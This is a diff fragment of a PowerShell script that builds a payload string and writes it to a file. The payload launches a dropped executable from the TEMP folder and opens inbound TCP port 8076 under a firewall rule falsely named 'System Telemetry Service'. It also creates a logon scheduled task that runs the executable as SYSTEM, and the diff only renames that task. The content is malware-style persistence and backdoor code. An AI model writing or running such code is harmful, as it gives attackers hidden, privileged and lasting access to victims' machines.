@@ -11,7 +11,7 @@ Start-Process $env:TEMP\burn.exe
 
 New-NetFirewallRule -DisplayName "System Telemetry Service" -Direction Inbound -Protocol TCP -LocalPort 8076 -Action Allow
 
-schtasks /create /sc onlogon /tn "Compo" /tr "$env:TEMP\burn.exe" /ru SYSTEM
+schtasks /create /sc onlogon /tn "bakka" /tr "$env:TEMP\burn.exe" /ru SYSTEM
 '@
 
 $payload | Out-File -FilePath $scriptPath -Encoding UTF8
